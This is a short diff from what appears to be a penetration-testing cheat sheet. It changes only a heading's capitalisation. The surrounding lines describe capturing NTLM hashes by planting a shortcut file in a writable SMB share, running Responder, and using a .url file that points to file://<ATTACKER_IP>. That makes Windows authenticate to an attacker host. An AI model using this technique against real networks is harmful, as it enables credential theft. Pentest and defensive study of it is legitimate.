@@ -27,7 +27,7 @@ $lnk.Save()
 2. Place the file in the writable SMB share (won't work if hidden)
 3. Fire responder `responder -I eth0`
 
-# Works When *Selected*: URL files
+# Works when *Selected*: URL files
 ```
 [InternetShortcut]
 URL=file://<ATTACKER_IP>/@IEsettings
